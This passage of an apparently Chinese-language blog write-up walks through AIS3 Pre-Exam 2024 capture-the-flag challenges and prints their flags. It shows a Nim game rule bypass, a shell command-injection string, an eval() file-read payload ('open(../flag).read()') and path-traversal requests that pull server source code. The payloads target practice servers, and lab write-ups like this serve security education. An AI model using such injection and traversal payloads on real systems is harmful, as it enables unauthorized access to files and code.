+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">play</span>(game: Game):
+</span></span><span style="display:flex;"><span>    ai_player <span style="color:#ff79c6">=</span> AIPlayer()
+</span></span><span style="display:flex;"><span>    win <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">not</span> game<span style="color:#ff79c6">.</span>ended():
+</span></span><span style="display:flex;"><span>        game<span style="color:#ff79c6">.</span>show()
+</span></span><span style="display:flex;"><span>        print_game_menu()
+</span></span><span style="display:flex;"><span>        choice <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">input</span>(<span style="color:#f1fa8c">&#39;it</span><span style="color:#f1fa8c">\&#39;</span><span style="color:#f1fa8c">s your turn to move! what do you choose? &#39;</span>)<span style="color:#ff79c6">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> choice <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;0&#39;</span>:
+</span></span><span style="display:flex;"><span>            pile <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">input</span>(<span style="color:#f1fa8c">&#39;which pile do you choose? &#39;</span>))
+</span></span><span style="display:flex;"><span>            count <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#8be9fd;font-style:italic">input</span>(<span style="color:#f1fa8c">&#39;how many stones do you remove? &#39;</span>))
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> game<span style="color:#ff79c6">.</span>make_move(pile, count):
+</span></span><span style="display:flex;"><span>                print_error(<span style="color:#f1fa8c">&#39;that is not a valid move!&#39;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">elif</span> choice <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;1&#39;</span>:
+</span></span><span style="display:flex;"><span>            game_str <span style="color:#ff79c6">=</span> game<span style="color:#ff79c6">.</span>save()
+</span></span><span style="display:flex;"><span>            digest <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">hash</span><span style="color:#ff79c6">.</span>hexdigest(game_str<span style="color:#ff79c6">.</span>encode())
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;you game has been saved! here is your saved game:&#39;</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(game_str <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;:&#39;</span> <span style="color:#ff79c6">+</span> digest)
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">elif</span> choice <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;2&#39;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># no move -&gt; player wins!</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> game<span style="color:#ff79c6">.</span>ended():
+</span></span><span style="display:flex;"><span>            win <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">break</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>            print_move(<span style="color:#f1fa8c">&#39;you&#39;</span>, count, pile)
+</span></span><span style="display:flex;"><span>            game<span style="color:#ff79c6">.</span>show()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># the AI plays a move</span>
+</span></span><span style="display:flex;"><span>        pile, count <span style="color:#ff79c6">=</span> ai_player<span style="color:#ff79c6">.</span>get_move(game)
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">assert</span> game<span style="color:#ff79c6">.</span>make_move(pile, count)
+</span></span><span style="display:flex;"><span>        print_move(<span style="color:#f1fa8c">&#39;i&#39;</span>, count, pile)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> win:
+</span></span><span style="display:flex;"><span>        print_flag(flag)
+</span></span><span style="display:flex;"><span>        exit(<span style="color:#bd93f9">0</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>:
+</span></span><span style="display:flex;"><span>        print_lose()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果在 choice 輸入的東西不是 0~2，遊戲會根據上次電腦的選擇來操作，而且有趣的地方就在他不會判斷是否真的可以從某堆拿 N 顆石頭。</p>
+<p>舉例來說，現在 1 piles 有 2 顆石頭，上次電腦在這堆拿了 5 顆，那麼若 choice 輸入不是 0~2 的東西，就會在 <code>還剩下 2 顆石頭的這個 pile 裡拿走 5 顆</code>，而這個無效操作只是會讓 make_move() return False 而已，不會拋出例外而跟你說他死了(但我們還是要先至少 move 一次，讓 pile 跟 count 這兩個變數是 assigned 的，否則 print_move() 會有問題)。</p>
+<p>相當於我們在這局拿走了 0 顆石頭，這樣局面就會變成我們必勝了。</p>
+<p>簡而言之，不要照規則走就對了</p>
+<p>附上解題過程：</p>
+<pre tabindex="0"><code>$ nc chals1.ais3.org 40004
+...
++--------------------- moved ---------------------+
+| you removed 13 stones from pile 2               |
++---+-------------- stones info ------------------+
+| 0 | ooooooooooooooooooooooo                     |
+| 1 | ooooo                                       |
+| 2 | ooooo                                       |
++--------------------- moved ---------------------+
+| i removed 23 stones from pile 0                 |
++---+-------------- stones info ------------------+
+| 0 | ooooo                                       |
+| 1 | ooooo                                       |
++---+--------------- game menu -------------------+
+| 0 | make a move                                 |
+| 1 | save the current game and leave             |
+| 2 | resign the game                             |
++---+---------------------------------------------+
+it&#39;s your turn to move! what do you choose? 3
++--------------------- moved ---------------------+
+| you removed 23 stones from pile 0               |
++---+-------------- stones info ------------------+
+| 0 | ooooo                                       |
+| 1 | ooooo                                       |
++--------------------- moved ---------------------+
+| i removed 4 stones from pile 1                  |
++---+-------------- stones info ------------------+
+| 0 | ooooo                                       |
+| 1 | o                                           |
++---+--------------- game menu -------------------+
+| 0 | make a move                                 |
+| 1 | save the current game and leave             |
+| 2 | resign the game                             |
++---+---------------------------------------------+
+it&#39;s your turn to move! what do you choose? 0
+which pile do you choose? 0
+how many stones do you remove? 4
++--------------------- moved ---------------------+
+| you removed 4 stones from pile 0                |
++---+-------------- stones info ------------------+
+| 0 | o                                           |
+| 1 | o                                           |
++--------------------- moved ---------------------+
+| i removed 1 stones from pile 0                  |
++---+-------------- stones info ------------------+
+| 0 | o                                           |
++---+--------------- game menu -------------------+
+| 0 | make a move                                 |
+| 1 | save the current game and leave             |
+| 2 | resign the game                             |
++---+---------------------------------------------+
+it&#39;s your turn to move! what do you choose? 0
+which pile do you choose? 0
+how many stones do you remove? 0
++--------------------- error ---------------------+
+| that is not a valid move!                       |
++---+-------------- stones info ------------------+
+| 0 | o                                           |
++---+--------------- game menu -------------------+
+| 0 | make a move                                 |
+| 1 | save the current game and leave             |
+| 2 | resign the game                             |
++---+---------------------------------------------+
+it&#39;s your turn to move! what do you choose? 0
+which pile do you choose? 0
+how many stones do you remove? 1
++---------------- congratulations ----------------+
+| you are a true grandmaster of chess! here is    |
+| the flag for you:                               |
+| AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}  |
++-------------------------------------------------+
+</code></pre><h4 id="flag-1">FLAG:</h4>
+<p>AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}</p>
+<h3 id="three-dimensional-secret">Three Dimensional Secret</h3>
+<pre tabindex="0"><code>I shall send printable secrets
+
+Author: ja20nl1n
+</code></pre><p>題目給了一個封包檔，所以用 WireShark 打開</p>
+<p>接著把 [PSH, ACK] 狀態 ( PSH 表示有資料，ACK 表示傳輸確認 ) 的封包用工人智慧(？把 data 部分 dump 下來：</p>
+<p>(後面的東西太多就不貼了)</p>
+<pre tabindex="0"><code>;FLAVOR:Marlin
+;TIME:788
+;Filament used: 8.45726m
+;Layer height: 10
+;MINX:58.496
+;MINY:58.537
+;MINZ:10
+;MAXX:241.742
+;MAXY:241.259
+;MAXZ:10
+;TARGET_MACHINE.NAME:Creality Ender-3 Max
+;Generated with Cura_SteamEngine 5.6.0
+M140 S60
+M105
+M190 S60
+M104 S200
+M105
+M109 S200
+M82 ;absolute extrusion mode
+; Ender 3 Max Custom Start G-code
+G92 E0 ; Reset Extruder
+G28 ; Home all axes
+G1 Z2.0 F3000 ; Move Z Axis up little to prevent scratching of Heat Bed
+G1 X0.1 Y20 Z0.3 F5000.0 ; Move to start position
+G1 X0.1 Y200.0 Z0.3 F1500.0 E15 ; Draw the first line
+G1 X0.4 Y200.0 Z0.3 F5000.0 ; Move to side a little
+G1 X0.4 Y20 Z0.3 F1500.0 E30 ; Draw the second line
+G92 E0 ; Reset Extruder
+G1 Z2.0 F3000 ; Move Z Axis up little to prevent scratching of Heat Bed
+G1 X5 Y20 Z0.3 F5000.0 ; Move over to prevent blob squish
+G92 E0
+G92 E0
+G1 F1500 E-6.5
+;LAYER_COUNT:1
+;LAYER:0
+M107
+...
+</code></pre><p>再根據題目標題可以知道這是 G Code，用來控制 3D 列印機等自控機器的代碼</p>
+<p>貼到隨便一個 online viewer 上去模擬就能看到 flag 了</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/three_dimensional_secret.png" alt="three_dimensional_secret"></p>
+<h4 id="flag-2">FLAG:</h4>
+<p>AIS3{b4d1y_tun3d_PriN73r}</p>
+<h3 id="emoji-console">Emoji Console</h3>
+<pre tabindex="0"><code>🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️ 
+Connection info: http://chals1.ais3.org:5000 
+Author: TriangleSnake
+</code></pre><p>使用 <code>🐱 ⭐</code> 可以看到 Source Code 以及 emoji 代表的文字，並發現 flag 是一個目錄，沒辦法直接 cat flag</p>
+<p>接著我試了 <code>💿 🚩😜ℹ️🅿️ ⭐</code> 可以發現 flag 裡有個 <code>flag-printer.py</code></p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/emoji_console_1.png" alt="emoji_console_1"></p>
+<p>於是使用 <code>💿 🚩😓😶🐍 ⭐</code> ( cd flag;/:|python * ) 來執行這個 .py 檔</p>
+<p>其實就是考 Linux 指令的 <code>;</code> 跟 <code>|</code> 的用法</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/emoji_console_2.png" alt="emoji_console_2"></p>
+<h4 id="flag-3">FLAG:</h4>
+<p>AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}</p>
+<h2 id="web">Web</h2>
+<h3 id="evil-calculator">Evil Calculator</h3>
+<pre tabindex="0"><code>This is a calculator written in Python. It&#39;s a simple calculator, but some function in it is VERY EVIL!! 
+Connection info: http://chals1.ais3.org:5001 
+Author: TriangleSnake
+</code></pre><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>@app.route(<span style="color:#f1fa8c">&#39;/calculate&#39;</span>, methods<span style="color:#ff79c6">=</span>[<span style="color:#f1fa8c">&#39;POST&#39;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">calculate</span>():
+</span></span><span style="display:flex;"><span>    data <span style="color:#ff79c6">=</span> request<span style="color:#ff79c6">.</span>json
+</span></span><span style="display:flex;"><span>    expression <span style="color:#ff79c6">=</span> data[<span style="color:#f1fa8c">&#39;expression&#39;</span>]<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34; &#34;</span>,<span style="color:#f1fa8c">&#34;&#34;</span>)<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;_&#34;</span>,<span style="color:#f1fa8c">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span>:
+</span></span><span style="display:flex;"><span>        result <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">eval</span>(expression)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">except</span> Exception <span style="color:#ff79c6">as</span> e:
+</span></span><span style="display:flex;"><span>        result <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(e)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> jsonify(result<span style="color:#ff79c6">=</span><span style="color:#8be9fd;font-style:italic">str</span>(result))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>從程式碼中可以看到他直接使用危險函式 eval() 來計算，但有過濾掉 <code>_</code> 跟空格，沒辦法 <code>__import__('os')</code> 來做 RCE</p>
+<p>但其實可以用 builtin function 中的 open() 來任意讀檔，從題目給的 <code>docker-compose.yml</code> 可知 flag 放在 /flag</p>
+<p>我的作法是直接 F12 修改前端讓他送 payload 過去</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/evil_calculator.png" alt="evil_calculator"></p>
+<p>記得跳脫引號字元</p>
+<pre tabindex="0"><code>appendToExpression(&#39;open(\&#39;../flag\&#39;).read()&#39;)
+</code></pre><p>或是用 burp 攔封包修改應該也行</p>
+<h4 id="flag-4">FLAG:</h4>
+<p>AIS3{7RiANG13_5NAK3_I5_50_3Vi1}</p>
+<h3 id="capoost">Capoost</h3>
+<pre tabindex="0"><code>Capoo like your post. Post something and capoo will give you flag!!!
+
+Hint: Try to read Dockerfile first.
+
+Connection info: http://capoost.chals1.ais3.org:5487
+
+Author: Chumy
+</code></pre><p>先找 Dockerfile</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_1.png" alt="image"></p>
+<p>帳號密碼先隨便打</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_2.png" alt="image"></p>
+<p>在 Create New Post 中 F12，看到</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_3.png" alt="image"></p>
+<p>在 updateTemplateFields 中可以看到會把所選的 template 透過 <code>GET /template/read?name=${selectedTemplate}</code>
+來獲取模板，因此可以懷疑這邊可以做檔案讀取</p>
+<p>跟上題一樣直接改前端就好</p>
+<p>或是直接打 <code>http://HOST:PORT/template/read?name=../Dockerfile</code> 也可以拿到</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_4.png" alt="image"></p>
+<p>可以看到是用 golang 寫的並且使用 make 編譯</p>
+<p>推測他有 makefile，所以用同上的方式拿 makefile</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_5.png" alt="image"></p>
+<p>在 makefile 裡又可以看到他編譯了哪些檔案，再把這些檔案用相同的方式拿出來，而這些檔案中又 import 了許多自訂的 module。</p>
+<p>假設 module 名為 capoost/models/user，可以到 ../models/user/user.go 拿到原始碼，把所有能拿的程式都拿到後，一個一個分析</p>
+<p><img src="/images/ctf/ais3_pre_exam_2024/capoost_6.png" alt="image"></p>
+<p>其中在 ../capoost/router/user/user.go 會將輸入的帳密用 BindJSON 打包後去呼叫 ../capoost/models/user/user.go 的 Login() 來比對</p>
+<p>capoost/router/user</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">login</span>(c <span style="color:#ff79c6">*</span>gin.Context) {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">var</span> userdata user.User
+</span></span><span style="display:flex;"><span>    c.<span style="color:#50fa7b">BindJSON</span>(<span style="color:#ff79c6">&amp;</span>userdata)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> !userdata.<span style="color:#50fa7b">Login</span>() {
+</span></span><span style="display:flex;"><span>        errutil.<span style="color:#50fa7b">AbortAndError</span>(c, <span style="color:#ff79c6">&amp;</span>errutil.Err{
+</span></span><span style="display:flex;"><span>            Code: <span style="color:#bd93f9">401</span>,
+</span></span><span style="display:flex;"><span>            Msg: <span style="color:#f1fa8c">&#34;username or password incorrect&#34;</span>,
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    session <span style="color:#ff79c6">:=</span> sessions.<span style="color:#50fa7b">Default</span>(c)
+</span></span><span style="display:flex;"><span>    session.<span style="color:#50fa7b">Set</span>(<span style="color:#f1fa8c">&#34;user&#34;</span>, userdata.Username)
+</span></span><span style="display:flex;"><span>    session.<span style="color:#50fa7b">Save</span>()
+</span></span><span style="display:flex;"><span>    c.<span style="color:#50fa7b">String</span>(<span style="color:#bd93f9">200</span>, <span style="color:#f1fa8c">&#34;Login success&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>capoost/models/user</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">func</span> <span style="color:#50fa7b">init</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">const</span> adminname = <span style="color:#f1fa8c">&#34;4dm1n1337&#34;</span>
+</span></span><span style="display:flex;"><span>    database.<span style="color:#50fa7b">GetDB</span>().<span style="color:#50fa7b">AutoMigrate</span>(<span style="color:#ff79c6">&amp;</span>User{})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> _, err <span style="color:#ff79c6">:=</span> <span style="color:#50fa7b">GetUser</span>(adminname); err <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    buf <span style="color:#ff79c6">:=</span> <span style="color:#8be9fd;font-style:italic">make</span>([]<span style="color:#8be9fd">byte</span>, <span style="color:#bd93f9">12</span>)
+</span></span><span style="display:flex;"><span>    _, err <span style="color:#ff79c6">:=</span> rand.<span style="color:#50fa7b">Read</span>(buf)
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> err <span style="color:#ff79c6">!=</span> <span style="color:#ff79c6">nil</span> {
+</span></span><span style="display:flex;"><span>        log.<span style="color:#50fa7b">Panicf</span>(<span style="color:#f1fa8c">&#34;error while generating random string: %s&#34;</span>, err)
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    User{
+</span></span><span style="display:flex;"><span>        <span style="color:#6272a4">//ID: 1,
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>        Username: adminname,
+</span></span><span style="display:flex;"><span>        Password: password.<span style="color:#50fa7b">New</span>(base64.StdEncoding.<span style="color:#50fa7b">EncodeToString</span>(buf)),
+</span></span><span style="display:flex;"><span>    }.<span style="color:#50fa7b">Create</span>()
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#8be9fd;font-style:italic">func</span> (user User) <span style="color:#50fa7b">Login</span>() <span style="color:#8be9fd">bool</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> user.Username <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;&#34;</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">false</span>
